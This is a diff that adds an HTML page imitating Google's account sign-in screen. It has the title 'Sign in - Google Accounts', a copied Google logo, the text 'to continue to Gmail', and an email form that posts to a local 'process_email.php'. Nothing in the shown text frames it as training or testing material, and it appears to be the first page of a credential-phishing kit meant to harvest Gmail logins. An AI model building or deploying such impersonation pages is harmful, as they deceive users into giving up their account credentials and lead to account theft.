@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        @import url('https://googleapis.com');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Open Sans', 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            background-color: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+        .card {
+            width: 100%;
+            max-width: 1040px;
+            min-height: 480px;
+            background: #fff;
+            border-radius: 28px;
+            padding: 36px;
+            display: flex;
+            flex-direction: row;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .left-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding-right: 48px;
+        }
+        .right-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            max-width: 448px;
+            width: 100%;
+            margin-left: auto;
+        }
+        .logo-container {
+            margin-bottom: 24px;
+        }
+        h2 {
+            font-size: 36px;
+            font-weight: 400;
+            color: #1f1f1f;
+            margin-bottom: 12px;
+            line-height: 1.25;
+            letter-spacing: -0.5px;
+        }
+        p {
+            font-size: 16px;
+            color: #444746;
+        }
+        .input-container {
+            position: relative;
+            margin-top: 16px;
+            margin-bottom: 16px;
+        }
+        input[type="email"] {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            outline: none;
+            transition: border 0.1s ease;
+        }
+        input[type="email"]:focus {
+            border: 2px solid #0b57d0;
+            padding: 15px 13px;
+        }
+        .forgot-pass {
+            margin-bottom: 32px;
+        }
+        .forgot-pass a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .forgot-pass a:hover {
+            text-decoration: underline;
+        }
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-account {
+            color: #0b57d0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        button[type="submit"] {
+            background-color: #0b57d0;
+            color: white;
+            border: none;
+            border-radius: 100px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button[type="submit"]:hover {
+            background-color: #0842a0;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background-color: #fff;
+                align-items: flex-start;
+                padding: 16px;
+            }
+            .card {
+                flex-direction: column;
+                box-shadow: none;
+                padding: 24px 16px;
+                border-radius: 0;
+            }
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 24px;
+            }
+            .right-section {
+                margin-left: 0;
+                max-width: 100%;
+            }
+            h2 {
+                font-size: 24px;
+            }
+            .button-row {
+                margin-top: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="left-section">
+            <div class="logo-container">
+                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://w3.org">
+                    <path d="M10.13 10.35v3.1h4.74c-.2 1.34-1.54 3.9-4.74 3.9-2.86 0-5.2-2.37-5.2-5.3s2.34-5.3 5.2-5.3c1.63 0 2.73.69 3.36 1.28l2.45-2.38C14.37 4.1 12.44 3.3 10.13 3.3 5.3 3.3 1.4 7.2 1.4 12s3.9 8.7 8.73 8.7c5.04 0 8.38-3.55 8.38-8.55 0-.59-.06-1.04-.13-1.5h-16.25z" fill="#4285F4"/>
+                    <path d="M25.37 8.7c-2.73 0-4.96 2.1-4.96 4.97s2.23 4.97 4.96 4.97 4.96-2.1 4.96-4.97-2.23-4.97-4.96-4.97zm0 7.8c-1.57 0-2.84-1.25-2.84-2.83s1.27-2.83 2.84-2.83 2.84 1.25 2.84 2.83-1.27 2.83-2.84 2.83z" fill="#EA4335"/>
+                    <path d="M36.47 8.7c-2.73 0-4.96 2.1-4.96 4.97s2.23 4.97 4.96 4.97 4.96-2.1 4.96-4.97-2.23-4.97-4.96-4.97zm0 7.8c-1.57 0-2.84-1.25-2.84-2.83s1.27-2.83 2.84-2.83 2.84 1.25 2.84 2.83-1.27 2.83-2.84 2.83z" fill="#FBBC05"/>
+                    <path d="M47.02 9.03h-.08c-.46-.54-1.33-1.03-2.45-1.03-2.3 0-4.22 2.02-4.22 4.94 0 2.88 1.92 4.93 4.22 4.93 1.12 0 1.99-.49 2.45-1.05h.08v.67c0 1.88-1.01 2.88-2.65 2.88-1.34 0-2.17-.96-2.52-1.78l-1.84.77c.53 1.26 1.91 2.8 4.36 2.8 2.53 0 4.67-1.48 4.67-5.1V9.3h-2.02v-.27zm-2.43 7.47c-1.51 0-2.65-1.28-2.65-2.83 0-1.57 1.14-2.84 2.65-2.84 1.49 0 2.62 1.29 2.62 2.84 0 1.55-1.13 2.83-2.62 2.83z" fill="#4285F4"/>
+                    <path d="M54.8 3.8h2.16v13.57h-2.16V3.8z" fill="#34A853"/>
+                    <path d="M63.87 16.5c-1.18 0-2.02-.54-2.56-1.62l7.07-2.92-.24-.6c-.44-1.12-1.72-3.18-4.42-3.18-2.66 0-4.88 2.08-4.88 4.97 0 2.86 2.19 4.97 5.09 4.97 2.35 0 3.72-1.43 4.31-2.2l-1.57-1.05c-.53.75-1.37 1.63-2.77 1.63zm-.12-8.1c1.02 0 1.83.51 2.13 1.27l-4.7 1.94c0-2.42 1.67-3.21-2.43-3.21z" fill="#EA4335"/>
+                </svg>
+            </div>
+            <h2>Sign in</h2>
+            <p>to continue to Gmail</p>
+        </div>
+
+        <div class="right-section">
+            <form id="emailForm" method="POST" action="process_email.php">
+                <div class="input-container">
+                    <input type="email" name="username" placeholder="Email or phone" required autofocus>
+                </div>
+                <div class="forgot-pass">
+                    <a href="#">Forgot email?</a>
+                </div>
+                <div class="button-row">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
